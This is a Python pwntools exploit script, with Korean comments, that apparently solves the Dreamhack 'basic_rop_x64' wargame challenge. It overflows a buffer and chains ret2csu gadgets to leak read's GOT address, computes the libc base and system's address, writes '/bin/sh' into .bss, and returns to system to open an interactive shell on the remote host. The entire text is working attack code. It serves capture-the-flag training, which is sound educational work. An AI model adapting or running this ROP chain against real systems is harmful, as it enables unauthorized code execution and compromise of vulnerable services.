from pwn import *

def slog(name, addr):
	return success(": ".join([name, hex(addr)]))


p = remote("host1.dreamhack.games", 9873)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
r = ROP(e)

#context.log_level = 'debug'


# [1] 정보 수집
read_got = e.got["read"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

ret = r.find_gadget(['ret'])[0]
pop_rdi = r.find_gadget(['pop rdi'])[0]
csu_init1 = 0x40087a
csu_init2 = 0x400860
bss = e.bss()
dummy = b'A'*8

payload = b'A'*72


# [2] write(1, read@got, 8) => read 함수의 실제 주소 출력
payload += p64(csu_init1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(read_got)
payload += p64(1)
payload += p64(csu_init2)


# [3] read(0, bss, 8) => bss 영역에 "/bin/sh" 쓰기
payload += dummy
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(bss)
payload += p64(0)
payload += p64(csu_init2)


# [4] return to main
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(main)


# [6] system 주소 leak, /bin/sh 쓰기
p.send(payload)

p.recvuntil(b'A'*64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("main", main)
slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b"/bin/sh\x00")


# [7] return to system
payload = b'A'*72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(system)

p.send(payload)

p.interactive()

